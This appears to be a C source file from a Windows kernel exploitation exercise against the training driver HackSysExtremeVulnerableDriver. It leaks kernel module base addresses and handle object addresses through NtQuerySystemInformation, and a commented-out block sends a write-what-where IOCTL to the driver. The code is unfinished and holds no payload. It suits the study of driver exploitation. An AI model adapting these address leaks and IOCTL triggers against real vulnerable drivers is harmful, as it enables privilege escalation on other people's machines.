#include <Windows.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <TlHelp32.h>
#include "ntos.h"


//Find ModuleBase
SIZE_T get_handle_addr(HANDLE h)
{
	ULONG len = 20;
	NTSTATUS status = (NTSTATUS)0xc0000004;
	PSYSTEM_HANDLE_INFORMATION_EX pHandleInfo = NULL;
	do {
		len *= 2;
		pHandleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)GlobalAlloc(GMEM_ZEROINIT, len);
		status = NtQuerySystemInformation(SystemExtendedHandleInformation, pHandleInfo, len, &len);
	} while (status == (NTSTATUS)0xc0000004);

	if (status != (NTSTATUS)0x0) {
		printf("NtQuerySystemInformation() failed with error: %#x\n", status);
		return 1;
	}

	DWORD mypid = GetProcessId(GetCurrentProcess());
	ULONG64 ptrs[1000] = { 0 };
	for (int i = 0; i < pHandleInfo->NumberOfHandles; i++) {
		PVOID object = pHandleInfo->Handles[i].Object;
		ULONG_PTR handle = pHandleInfo->Handles[i].HandleValue;
		DWORD pid = (DWORD)pHandleInfo->Handles[i].UniqueProcessId;
		if (pid != mypid)
			continue;
		if (handle == (ULONG_PTR)h)
			return (ULONG64)object;
	}
	return -1;
}

SIZE_T get_module_addr()
{
	UCHAR* tMdName = NULL;
	PVOID ImageBase = NULL;
	ULONG ImageSize = 0;

	NTSTATUS status = (NTSTATUS)0xc0000004;
	DWORD Buffer_Size = 0x20;
	PRTL_PROCESS_MODULES pModuleInfo = NULL;

	do {
		Buffer_Size *= 2;
		pModuleInfo = (PRTL_PROCESS_MODULES)GlobalAlloc(GMEM_ZEROINIT, Buffer_Size);
		status = NtQuerySystemInformation(SystemModuleInformation, pModuleInfo, Buffer_Size, &Buffer_Size);
	} while (status == (NTSTATUS)0xc0000004);

	if (status != 0) {
		printf("NtQuerySystemInformation() failed with error: %#x\n", status);
		return 1;
	}

	printf("[?] Success!!!");
	for (int i = 0; i < pModuleInfo->NumberOfModules; i++)
	{
		tMdName = pModuleInfo->Modules[i].FullPathName;
		ImageBase = pModuleInfo->Modules[i].ImageBase;
		ImageSize = pModuleInfo->Modules[i].ImageSize;

		//Find target Module
		/*
		if (strstr(tMdName, mdName)) {
			return pModuleInfo->Modules[i].ImageBase;
		}
		*/

		printf("Module:  %s\tImageBase:	%p\tImageSize: %p\n", tMdName, ImageBase, ImageSize);
	}

}
int main()
{
	/*
	//Open devices
	HANDLE hDevice;

	LPVOID lUserBuffer;
	DWORD dwUserSize;
	DWORD dwBytesReturned;

	//Open Devices
	hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
		NULL
	);

	if (hDevice == NULL || hDevice == INVALID_HANDLE_VALUE) {
		printf("CreateFileA Failed!");
		return 0;
	}

	dwUserSize = 0x10;
	lUserBuffer = malloc(dwUserSize);

	//what 0x41414141
	memset((char*)lUserBuffer, 0x41, 8);
	//Where 
	memset((char*)lUserBuffer + 8, 0x42, 8);

	DeviceIoControl(hDevice, 0x222003 + 8, lUserBuffer, dwUserSize,
		NULL, 0, &dwBytesReturned, NULL);

	printf("All UserBuffer is transformed !!!");

	*/

	get_module_addr();
	return 0;
}